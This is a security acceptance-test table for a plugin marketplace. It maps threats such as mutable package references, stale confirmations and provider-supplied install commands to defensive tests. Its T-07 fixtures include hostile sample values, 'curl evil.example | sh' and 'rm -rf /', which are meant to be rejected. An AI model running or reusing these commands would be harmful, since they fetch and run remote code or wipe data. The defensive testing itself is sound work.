# DSH Community Market — Phase 4 Security Test Table

> Companion to `threat-model.md`. Each threat T-NN from that document maps to one or more acceptance tests here. The Phase 4 implementation does not begin until this matrix is approved by Anywhere Labs.

> Date: 2026-08-17
> Author: external team (Phase 0-3 maintainer)

## Conventions

| Column | Meaning |
|---|---|
| Threat | `T-NN` from `threat-model.md` |
| Test type | `unit` (vitest), `fixture` (network fixture on disk), `smoke` (Cordis harness with mocked services), `manual` (requires Labs runner) |
| Setup | How the test is constructed |
| Expectation | What must hold for the test to pass |
| Status | Pending |

Phase 4 implementation **must not merge** unless every Status becomes `Pass` or `Deferred-with-reason`.

## T-01 Mutable npm version reference

| Test type | Setup | Expectation |
|---|---|---|
| unit | `resolveNpmTarget(item with latestVersion='1.2.0')` | `target = 'dsh-plugin-better-sidebar@1.2.0'`, format matches SemVer regex |
| unit | item with `latestVersion: 'latest'` | throws `IdentityError(reason='mutable-ref', detail='npm dist-tag: latest')` |
| unit | item with `latestVersion: '^1.2.0'` | throws `IdentityError(reason='mutable-ref', detail='range')` |
| unit | item with `latestVersion: '~1.2.0'` | throws `IdentityError(reason='mutable-ref', detail='range')` |
| unit | item with `latestVersion: '1.x'` | throws `IdentityError(reason='mutable-ref', detail='range')` |
| unit | item with `latestVersion: 'next'` (dist-tag other than `latest`) | throws `IdentityError(reason='mutable-ref', detail='npm dist-tag: next')` |
| unit | item with `latestVersion: '*'` | throws `IdentityError(reason='mutable-ref', detail='wildcard')` |
| unit | item with no `latestVersion` (only repo) | not invoked — repo path T-02 |
| smoke | full install flow with mutable npm | install button is disabled in UI; confirm dialog does not render |
| unit | item with `latestVersion: '1.2.0-beta.1'` | accepted; SemVer pre-release format |
| unit | item with `latestVersion: '1.2.0+build.5'` | accepted; SemVer build metadata format |

## T-02 Mutable Git reference

| Test type | Setup | Expectation |
|---|---|---|
| unit | item with `repository: { url: 'https://github.com/o/r' }` (no commit) | throws `IdentityError(reason='no-immutable-ref')`; install button disabled |
| unit | item with `repository: { url: 'https://github.com/o/r', ref: 'main' }` | throws `IdentityError(reason='mutable-ref', detail='branch:main')` |
| unit | item with `repository: { url: 'https://github.com/o/r', ref: 'v1.2.0' }` (mutable tag) | throws `IdentityError(reason='mutable-ref', detail='tag')` |
| unit | item with `repository: { url: 'https://github.com/o/r', commit: '<40 hex>' }` | `target = 'git+https://github.com/o/r.git#<commit>'` |
| unit | item with `repository: { url: 'https://github.com/o/r', commit: '<short sha>' }` | throws `IdentityError(reason='bad-commit-format')` |
| unit | item with `repository: { url: 'https://gitlab.com/o/r', commit: '<hex>' }` | accepted (gitlab allowed by `https://*.git` pattern) |
| unit | item with `repository: { url: 'http://github.com/o/r', commit: '<hex>' }` (http) | rejected by `normalizeRepositoryUrl` (T- scheme) |
| unit | item with `repository: { url: 'https://user:pass@github.com/o/r', commit: '<hex>' }` (credentials) | rejected by `normalizeRepositoryUrl` (T- credentials) |

## T-03 Conflicting package + repository identities

| Test type | Setup | Expectation |
|---|---|---|
| unit | item with both `package: { name, latestVersion }` and `repository: { url, commit }` | `declaresBothNpmAndRepository` returns `true`; install button disabled |
| unit | item with both, user picks npm in confirm | target = npm spec; identityChoice='npm' recorded |
| unit | item with both, user picks repository in confirm | target = repo+commit; identityChoice='repository' recorded |
| unit | item with both, identityChoice is missing | throws `IdentityError(reason='identity-choice-required')` |
| smoke | confirm dialog UI renders both options | both buttons visible; neither pre-selected |
| smoke | confirm with both selected (mutually exclusive) | error returned, no install |

## T-04 Stale confirmation across profile / generation change

| Test type | Setup | Expectation |
|---|---|---|
| unit | confirm token bound to `{ profile: { name: 'A', dir: '/p/A' }, generationId: 'G1' }`; before invoke, `desktopProfiles.current` returns `{ name: 'B', dir: '/p/B' }` | `runPlugin` not invoked; `StaleConfirmationError(profile)` returned |
| unit | same as above but generation rotates | `runPlugin` not invoked; `StaleConfirmationError(generation)` returned |
| smoke | full confirm → switch profile via `desktopProfiles.select` → re-confirm | second confirm fails with stale profile message; no install |
| smoke | full confirm → settings update → re-confirm | second confirm fails with stale generation message; no install |
| unit | confirm token's `expiresAt` < now | `StaleConfirmationError(ttl)` returned |

## T-05 Stale snapshot confirmation

| Test type | Setup | Expectation |
|---|---|---|
| unit | confirm token bound to `fetchedAt: T1`; just before invoke, host re-fetches; new `fetchedAt: T2 ≠ T1` | `StaleSnapshotError(itemId)` returned |
| unit | confirm token bound to identity X; re-fetch returns item with identity Y (provider rotated) | `StaleSnapshotError(identity-changed)` returned |
| smoke | confirm → background refresh → re-confirm | re-confirm surfaces "snapshot was updated" with diff link |
| smoke | confirm → re-fetch fails (offline) | `StaleSnapshotError(network)` returned |

## T-06 Cursor reuse across sources / queries

| Test type | Setup | Expectation |
|---|---|---|
| unit | `cursorBelongsTo('C1', 'S1', [...], Q1)` | returns true |
| unit | `cursorBelongsTo('C1', 'S2', [...], Q1)` (different source) | returns false (or throws; Phase 5 implements the store) |
| unit | `cursorBelongsTo('C1', 'S1', [...], Q2)` (different query) | returns false |
| unit | `cursorBelongsTo('', 'S1', [...], Q1)` (empty) | returns false |
| unit | `cursorBelongsTo('x'.repeat(2049), 'S1', [...], Q1)` (over 2048) | returns false |

## T-07 Provider-supplied install command

| Test type | Setup | Expectation |
|---|---|---|
| fixture | provider response with `items: [{ ..., install: 'curl evil.example | sh' }]` | ajv snapshot validator rejects (`additionalProperties: false`) |
| unit | host reads `item.install` for install target derivation | install target derivation does NOT consult `install`, `installCommand`, `script`, `command`; field is silently ignored if present |
| smoke | confirm dialog text | dialog contains "lifecycle script" warning; never displays provider's `install` string verbatim |
| fixture | provider response with `items: [{ ..., installCommand: '...' }]` | same as above |
| fixture | provider response with deeply nested `items: [{ ..., command: 'rm -rf /' }]` | same as above |

## T-08 Lifecycle script disclosure

| Test type | Setup | Expectation |
|---|---|---|
| smoke | confirm dialog content (zh-CN) | contains phrase "package 安装可能执行 lifecycle script" |
| smoke | confirm dialog content (en) | contains phrase "lifecycle scripts may run" |
| unit | dialog text renderer | includes the literal lifecycle-warning phrase; phrase is present in both locale bundles |
| smoke | render with second-step required (per §11.5 install matrix) | second-step dialog re-displays lifecycle warning |
| unit | if either locale bundle lacks the phrase | test fails; i18n contract requires the phrase in both |

## T-09 Generation lock lost during long confirmation

| Test type | Setup | Expectation |
|---|---|---|
| unit | confirm token with TTL=30s; sleep 31s | `StaleConfirmationError(ttl)` returned |
| unit | confirm token TTL configurability | TTL is a constant in v1; no user override; test asserts it's not exposed |
| smoke | confirm → wait → confirm | second confirm fails with ttl message |
| unit | token TTL ≤ 0 | `StaleConfirmationError(ttl)` returned at creation time |

## T-10 Render-time mutation

| Test type | Setup | Expectation |
|---|---|---|
| code review | grep `runPlugin(['add', ...])` call sites | exactly one site; the `target` arg is the locally derived `name@version` or `git+...#commit` |
| unit | identity resolver returns same string for two calls on same input | deterministic; no time-of-check injection possible |
| smoke | between derive-target and runPlugin, manually mutate the snapshot | re-fetch must detect the change and refuse (T-05) |

## T-11 Renderer-controlled target

| Test type | Setup | Expectation |
|---|---|---|
| unit | confirm route receives `{ sourceRecordId, itemId, identityChoice, target: '...' }` | `target` field is ignored; Host looks up item from its snapshot, derives target locally |
| unit | confirm route receives `{ sourceRecordId, itemId: 'phantom', identityChoice }` | `ItemNotFoundError` returned; no install |
| unit | confirm route receives `{ sourceRecordId: 'phantom', itemId, identityChoice }` | `SourceNotFoundError` returned; no install |
| smoke | renderer tries to set `target` to a malicious package | install runs against the snapshot-derived target, not the renderer-supplied one |

## T-12 Cursor leak in error responses

| Test type | Setup | Expectation |
|---|---|---|
| unit | dispatchMarketRequest returns 400 for invalid body | response body is `{ error: { reason: '...' } }`; does not contain raw body, path, env, or command string |
| unit | dispatchMarketRequest returns 500 for internal failure | response body excludes provider URLs and stack traces |
| unit | dispatchMarketRequest returns 200 with cursor in response | cursor appears as a string field; no internal state leaks around it |
| smoke | capture all error responses from a synthetic failure run | manual review confirms no leakage |
| unit | error reason values are from a closed enum | new reason codes are reviewed before merging |

## T-13 Concurrent installs

| Test type | Setup | Expectation |
|---|---|---|
| smoke | two confirms issued within 50ms | one proceeds; the other surfaces "another install is in progress" |
| smoke | two confirms, second queued behind first's `desktopPnpm.runPlugin` | first completes; second proceeds; both succeed in order |
| unit | host's confirm handler is re-entrant | confirm handler can be called twice in the same generation without crashing |

## Cross-cutting acceptance

- The Host's confirm handler must NOT accept a `target` field from the client (T-11).
- The Host's error responses must be parseable JSON with bounded fields (T-12).
- The Host's identity resolver must be pure functions of the current snapshot (T-10).
- All schema-validated input (Phase 2) is the only path into identity resolution.
- Tests in this table are wired into `yarn workspace dsh-community-market test` (vitest) and `yarn workspace dsh-community-market verify:contract` (where applicable).
- A new `yarn workspace dsh-community-market verify:install-security` script is added in M4.5 to run the security matrix as a single command.

## Sign-off

| Reviewer | Decision | Date |
|---|---|---|
| Anywhere Labs security | Pending — blocks Phase 4 implementation |  |
| External team lead | Pending |  |

Until both rows are signed, no Phase 4 implementation commits are made.